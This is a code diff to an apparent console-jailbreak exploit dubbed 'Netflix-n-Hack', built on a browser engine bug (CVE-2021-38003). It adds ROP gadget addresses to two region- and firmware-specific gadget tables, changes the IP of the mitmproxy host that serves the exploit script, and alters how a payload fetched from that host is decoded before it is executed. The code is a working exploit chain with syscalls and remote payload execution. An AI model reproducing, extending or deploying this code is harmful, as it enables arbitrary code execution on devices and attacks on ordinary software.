@@ -2,7 +2,7 @@
 // based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
 // thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html
 
-const ip_script = "10.0.0.2"; // IP address of computer running mitmproxy.. MITM Proxy is handling it --> Needs to be updated
+const ip_script = "192.168.0.16"; // IP address of computer running mitmproxy.. MITM Proxy is handling it --> Needs to be updated
 const ip_script_port = 8080; //port which mitmproxy is running on
 // #region misc
 
@@ -396,6 +396,13 @@ gadgets_eu_6 = {
     pop_rsp_pop_rbp:       0x17ecb4en,
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
+    
+    
+    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
+    mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
+                                                        // the jne is neved executed if the value in rsi does not end in 1
+    mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
+                                                        // point rdx to a valid address
 };
 
 gadgets_us_5 = {
@@ -416,6 +423,13 @@ gadgets_us_5 = {
     pop_rsp_pop_rbp:       0x17ecb4en,
     mov_qword_ptr_rdi_rax: 0x1dcba9n,
     mov_qword_ptr_rdi_rdx: 0x36db4en,
+    
+    
+    /** Following Gadgets used to mov_rdi_qword_ptr_rsi **/
+    mov_rsi_qword_ptr_rsi_test_sil_1_jne: 0x12ee681n,   // mov rsi, qword ptr [rsi] ; test sil, 1 ; jne 0x12ee68b ; ret
+                                                        // the jne is neved executed if the value in rsi does not end in 1
+    mov_rdi_rsi_mov_qword_ptr_rdx_rdi:    0x09776c4n,   // mov rdi, rsi ; mov qword ptr [rdx], rdi ; ret
+                                                        // point rdx to a valid address
 };
 
 gadgets_list = {
@@ -1190,6 +1204,36 @@ function main () {
             syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
             syscall(SYSCALL.close, fd);  
         }
+        
+        if (typeof TextDecoder === "undefined") {
+                class _UTF8Decoder {
+                    decode(bytes) {
+                        let out = "";
+                        let i = 0;
+                        const len = bytes.length;
+
+                        while (i < len) {
+                            let c = bytes[i++];
+
+                            if (c < 128) {
+                                out += String.fromCharCode(c);
+                            } else if (c > 191 && c < 224) {
+                                out += String.fromCharCode(((c & 31) << 6) | (bytes[i++] & 63));
+                            } else {
+                                out += String.fromCharCode(
+                                    ((c & 15) << 12) |
+                                    ((bytes[i++] & 63) << 6) |
+                                    (bytes[i++] & 63)
+                                );
+                            }
+                        }
+                        return out;
+                    }
+                }
+
+                var TextDecoder = _UTF8Decoder;
+            }
+
 
         send_notification("ð\x9F¥³ð\x9F¥³ Netflix-n-Hack ð\x9F¥³ð\x9F¥³");
 
@@ -1545,7 +1589,8 @@ function main () {
                     bytes[i] = Number(read);
                 }
 
-                const js_code = String.fromCharCode.apply(null, bytes);
+                const js_code = new TextDecoder("utf-8").decode(bytes);
+
 
                 logger.log("Executing payload...");
                 logger.flush();
